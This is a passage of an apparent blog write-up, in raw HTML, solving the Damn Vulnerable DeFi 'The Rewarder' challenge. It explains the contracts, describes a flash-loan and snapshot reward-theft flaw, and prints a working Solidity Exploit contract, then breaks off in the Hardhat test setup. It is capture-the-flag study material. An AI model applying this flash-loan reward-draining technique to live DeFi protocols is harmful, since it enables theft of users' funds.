punctuation\">,</span> rewards<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                lastRewardTimestamps<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> block<span class=\"token punctuation\">.</span>timestamp<span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n<span class=\"token comment\">// [OMIT]</span></code></pre></div>\n<p>If the withdraw function is called in the Round: 3 situation, the Balance value of the Account Pool can be retrieved. As shown in the figure above, the Balance value becomes 0, but it can be seen that the Snapshot and Reward continue to maintain the value.</p>\n<blockquote>\n<p>RewardToken.sol</p>\n</blockquote>\n<h3 id=\"dependency-2\" style=\"position:relative;\"><a href=\"#dependency-2\" aria-label=\"dependency 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Dependency</h3>\n<ul>\n<li>ERC20 of the openzeppelin library and AccessControl contract are dependent and used.</li>\n</ul>\n<h3 id=\"state-variable-1\" style=\"position:relative;\"><a href=\"#state-variable-1\" aria-label=\"state variable 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>State Variable</h3>\n<p>`bytes32 public constant MINTER_ROLE = keccak256(MINTER_ROLE);</p>\n<ul>\n<li>Since we use the RAC function of the AccessControl contract, we hash each Role to keccak256.</li>\n</ul>\n<h3 id=\"functions-2\" style=\"position:relative;\"><a href=\"#functions-2\" aria-label=\"functions 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Functions</h3>\n<p><code class=\"language-text\">constructor() ERC20(Reward Token, RWT)</code></p>\n<ul>\n<li>Proceed with ERC20 token initial setting and set RAC function through <code class=\"language-text\">_setupRole</code> function.</li>\n</ul>\n<p><code class=\"language-text\">function mint(address to, uint256 amount) external</code></p>\n<p> Check whether the MINTER_ROLE value is allowed through the hasRole function and then check whether <code class=\"language-text\">msg.sender</code>is allowed.</p>\n<ul>\n<li>Call the <code class=\"language-text\">_mint</code> function.</li>\n</ul>\n<blockquote>\n<p>AccountingToken.sol</p>\n</blockquote>\n<h3 id=\"dependency-3\" style=\"position:relative;\"><a href=\"#dependency-3\" aria-label=\"dependency 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Dependency</h3>\n<ul>\n<li>ERC20Snapshot of the openzeppelin library and AccessControl contract are dependent and used.State Variable</li>\n</ul>\n<h3 id=\"state-variable-2\" style=\"position:relative;\"><a href=\"#state-variable-2\" aria-label=\"state variable 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>State Variable</h3>\n<p><code class=\"language-text\">bytes32 public constant MINTER_ROLE = keccak256(MINTER_ROLE);\nbytes32 public constant SNAPSHOT_ROLE = keccak256(SNAPSHOT_ROLE);\nbytes32 public constant BURNER_ROLE = keccak256(BURNER_ROLE);</code></p>\n<h3 id=\"functions-3\" style=\"position:relative;\"><a href=\"#functions-3\" aria-label=\"functions 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Functions</h3>\n<p><code class=\"language-text\">constructor() ERC20(rToken, rTKN)</code></p>\n<ul>\n<li>Proceed with ERC20 initial setting and set RAC for each ROLE designated as state variable through <code class=\"language-text\">_setupRole</code> function.</li>\n</ul>\n<p><code class=\"language-text\">function mint(address to, uint256 amount) external</code></p>\n<p> Check if MINTER_ROLE ROLE is msg.sender with hasRole function.</p>\n<ul>\n<li>Call the <code class=\"language-text\">_mint</code> function.</li>\n</ul>\n<p><code class=\"language-text\">function burn(address from, uint256 amount) external</code></p>\n<p> Check if <code class=\"language-text\">BURNER_ROLE</code> ROLE is <code class=\"language-text\">msg.sender</code> with <code class=\"language-text\">hasRole</code> function.</p>\n<ul>\n<li>Call the <code class=\"language-text\">_burn</code> function.</li>\n</ul>\n<p><code class=\"language-text\">function snapshot() external returns (uint256)</code></p>\n<p> Check if <code class=\"language-text\">SNAPSHOT_ROLE</code> ROLE is <code class=\"language-text\">msg.sender</code> with <code class=\"language-text\">hasRole</code> function.</p>\n<ul>\n<li>Execute the ERC20 snapshot logic by calling the <code class=\"language-text\">_snapshot</code> function.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token comment\">/**\n     * @dev Creates a new snapshot and returns its snapshot id.\n     *\n     * Emits a {Snapshot} event that contains the same id.\n     *\n     * {_snapshot} is `internal` and you have to decide how to expose it externally. Its usage may be restricted to a\n     * set of accounts, for example using {AccessControl}, or it may be open to the public.\n     *\n     * [WARNING]\n     * ====\n     * While an open way of calling {_snapshot} is required for certain trust minimization mechanisms such as forking,\n     * you must consider that it can potentially be used by attackers in two ways.\n     *\n     * First, it can be used to increase the cost of retrieval of values from snapshots, although it will grow\n     * logarithmically thus rendering this attack ineffective in the long term. Second, it can be used to target\n     * specific accounts and increase the cost of ERC20 transfers for them, in the ways specified in the Gas Costs\n     * section above.\n     *\n     * We haven't measured the actual numbers; if this is something you're interested in please reach out to us.\n     * ====\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_snapshot</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> virtual <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        _currentSnapshotId<span class=\"token punctuation\">.</span><span class=\"token function\">increment</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">uint256</span> currentId <span class=\"token operator\">=</span> <span class=\"token function\">_getCurrentSnapshotId</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Snapshot</span><span class=\"token punctuation\">(</span>currentId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> currentId<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span></code></pre></div>\n<p>If you analyze the implementation code, you can see that the ID value is issued in increments using the <code class=\"language-text\">_currentSnapshotId</code> Counter instance value, the transaction event is recorded, and the current ID value is returned through the <code class=\"language-text\">_getCurrentSnapshotId()</code> function.</p>\n<h2 id=\"contract-business-flow\" style=\"position:relative;\"><a href=\"#contract-business-flow\" aria-label=\"contract business flow permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Contract Business Flow</h2>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAAsTAAALEwEAmpwYAAACJUlEQVQoz2Ng4VDEhhSY2RRUlNw4OFUYWGQYWGSZ2OQZWKQFhAz4BfUYWWRYOZVYOBQZ4BpYOZVAiEOJjUuZgUEiM7nt1eNvXc1LOHk0pOTMeIU0ZeXsJ9Sd7a48KiJmysgqy8qpBNXMzK7AyCbLyCrLzK7AxCrHw681f9qu////79p0nodPR1bRgltAzcEmdevcHxtnfFZT8WJgkmTjVIZoVuDm0xaXsBYXt2LnUlPTdDAw8ZKXtyvPn6av68vAJMXMLCsuZcTJo2punGBqGMPEJgexEqpZWtJpSvfOurIlUpL2ugauPIKaDEzSDAxijCwyjGzyqup28kpWDIwSGmq+KsoeDHA/s3IqMbLJqav4Hd74eOX0cyZG4YIiOgxMMowsMgwMUgwMkuzcyrLyFgwM4prqfhtnfl495a2ioisDsxQrxNnM7AriEtbe7nnuTtlSUjaa2o7CYnpGBoGLZu7zcEnj4deQljMTkdDX0fKb33lnZus1KWkbiOWIAGNglmVkkWNklefkVZWWM182d+////+P7buppuoirWDGwaPGwCAuJm4uKmrMwCTByqmMEVWwCGNgEA8JKD5z+H5eZhcLh6KhiZe6loOgsGFF1obi1JW8/DpMbPKsHEoMOBKJEgOzFL+ALjOzNCOrHDefBo+Aqp1V6qZZX9ZP/6CjFcTAJAGPKiyIjUuZiU0OEqogT7HIcnCrJYROjAroZONUYmZXADobAK9HcyviM9ftAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Contract Business Flow\"\n        title=\"Contract Business Flow\"\n        src=\"/static/aebb20731e1c5eee4e5d3c47ca5ab1e8/37523/c5-3.png\"\n        srcset=\"/static/aebb20731e1c5eee4e5d3c47ca5ab1e8/e9ff0/c5-3.png 180w,\n/static/aebb20731e1c5eee4e5d3c47ca5ab1e8/f21e7/c5-3.png 360w,\n/static/aebb20731e1c5eee4e5d3c47ca5ab1e8/37523/c5-3.png 720w,\n/static/aebb20731e1c5eee4e5d3c47ca5ab1e8/e996b/c5-3.png 1050w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>Since the contract is composed of each function, each function plays a certain role, and the main function determines the dependency to create a business flow and analyze it.</p>\n<h2 id=\"vulnerability\" style=\"position:relative;\"><a href=\"#vulnerability\" aria-label=\"vulnerability permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerability</h2>\n<p>We identified the function of each contract based on audit. Since the Snapshot function is currently used in the reward issuance process, it was found that the Balance value and the reward value do not check each other during the actual withdrawal process. However, since it is a process after making an actual deposit, a line operation is required. Here, an attacker can obtain LiquidityToken by calling the FlashLoan function in the Flash Loan Pool, and then execute the Reward vulnerability logic to steal the balance.</p>\n<p>The FlashLoan function inside the FlashLoanPool contract performs <code class=\"language-text\">transfer</code> and lends the user as much as the value in the pool, and then calls the <code class=\"language-text\">receiveFlashLoan</code>(uint) function, which has not been implemented yet, <code class=\"language-text\">functionCall</code> At this time, after importing the target contract deployed from the arbitrarily implemented contract, there is a vector that can implement the <code class=\"language-text\">receiveFlashLoan</code> function.</p>\n<p>After borrowing the entire balance from flashLoanPool, the attacker deposits it in the reward pool to perform the reward logic. At this time, based on the reward snapshot management vulnerability, call withdraw from this pool to withdraw the balance and pay off the flashLoan loan.</p>\n<p>If a reward is issued after arbitrarily manipulating a transaction for 5 days, as described above, the actual reward value is alive because of the snapshot function, so an attacker can steal it.</p>\n<h2 id=\"solve\" style=\"position:relative;\"><a href=\"#solve\" aria-label=\"solve permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Solve</h2>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"./FlashLoanerPool.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"./RewardToken.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"./TheRewarderPool.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"../DamnValuableToken.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Exploit</span> <span class=\"token punctuation\">{</span>\n    TheRewarderPool <span class=\"token keyword\">public</span> theRewarderPool<span class=\"token punctuation\">;</span>\n    FlashLoanerPool <span class=\"token keyword\">public</span> flashLoanerPool<span class=\"token punctuation\">;</span>\n    RewardToken <span class=\"token keyword\">public</span> rewardToken<span class=\"token punctuation\">;</span>\n    DamnValuableToken <span class=\"token keyword\">public</span> liquidityToken<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _theRewarderPoolContract<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _flashLoanerPoolContract<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _rewardTokenContract<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _liquidityTokenContract<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        theRewarderPool <span class=\"token operator\">=</span> <span class=\"token function\">TheRewarderPool</span><span class=\"token punctuation\">(</span>_theRewarderPoolContract<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        flashLoanerPool <span class=\"token operator\">=</span> <span class=\"token function\">FlashLoanerPool</span><span class=\"token punctuation\">(</span>_flashLoanerPoolContract<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        rewardToken <span class=\"token operator\">=</span> <span class=\"token function\">RewardToken</span><span class=\"token punctuation\">(</span>_rewardTokenContract<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        liquidityToken <span class=\"token operator\">=</span> <span class=\"token function\">DamnValuableToken</span><span class=\"token punctuation\">(</span>_liquidityTokenContract<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">function</span> <span class=\"token function\">receiveFlashLoan</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">{</span>\n        liquidityToken<span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>theRewarderPool<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        theRewarderPool<span class=\"token punctuation\">.</span><span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        theRewarderPool<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        liquidityToken<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_exploit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token punctuation\">{</span>\n        flashLoanerPool<span class=\"token punctuation\">.</span><span class=\"token function\">flashLoan</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        rewardToken<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> rewardToken<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">}</span> </code></pre></div>\n<div class=\"gatsby-highlight\" data-language=\"tsx\"><pre class=\"language-tsx\"><code class=\"language-tsx\"><span class=\"token keyword\">const</span> <span class=\"token punctuation\">{</span> ethers <span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hardhat'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> <span class=\"token punctuation\">{</span> expect <span class=\"token punctuation\">}</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token string\">'chai'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">describe</span><span class=\"token punctuation\">(</span><span class=\"token string\">'[Challenge] The rewarder'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token keyword\">let</span> deployer<span class=\"token punctuation\">,</span> alice<span class=\"token punctuation\">,</span> bob<span class=\"token punctuation\">,</span> charlie<span class=\"token punctuation\">,</span> david<span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">let</span> users<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">const</span> <span class=\"token constant\">TOKENS_IN_LENDER_POOL</span> <span class=\"token operator\">=</span> ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1000000'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 1 million tokens</span>\n\n    <span class=\"token function\">before</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">/** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */</span>\n\n        <span class=\"token punctuation\">[</span>deployer<span class=\"token punctuation\">,</span> alice<span class=\"token punctuation\">,</span> bob<span class=\"token punctuation\">,</span> charlie<span class=\"token punctuation\">,</span> david<span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getSigners</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        users <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>alice<span class=\"token punctuation\">,</span> bob<span class=\"token punctuation\">,</span> charlie<span class=\"token punctuation\">,</span> david<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">const</span> FlashLoanerPoolFactory <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'FlashLoanerPool'</span><span class=\"token punctuation\">,</span> deployer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">const</span> TheRewarderPoolFactory <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'TheRewarderPool'</span><span class=\"token punctuation\">,</span> deployer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">const</span> DamnValuableTokenFactory <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'DamnValuableToken'</span><span class=\"token punctuation\">,</span> deployer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">const</span> RewardTokenFactory <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'RewardToken'</span><span class=\"token punctuation\">,</span> deployer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">const</span> AccountingTokenFactory <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'AccountingToken'</span><span class=\"token punctuation\">,</span> deployer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>liquidityToken <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> DamnValuableTokenFactory<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>flashLoanPool <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> FlashLoanerPoolFactory<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>liquidityToken<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// Set initial token balance of the pool offering flash loans</span>\n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>liquidityToken<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>flashLoanPool<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span> <span class=\"token constant\">TOKENS_IN_LENDER_POOL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>rewarderPool <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> TheRewarderPoolFactory<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>liquidityToken<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>rewardToken <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> RewardTokenFactory<span class=\"token punctuation\">.</span><span class=\"token function\">attach</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>rewarderPool<span class=\"token punctuation\">.</span><span class=\"token function\">rewardToken</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>accountingToken <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> AccountingTokenFactory<span class=\"token punctuation\">.</span><span class=\"token function\">attach</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>rewarderPool<span class=\"token punctuation\">.</span><span class=\"token function\">accToken</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span 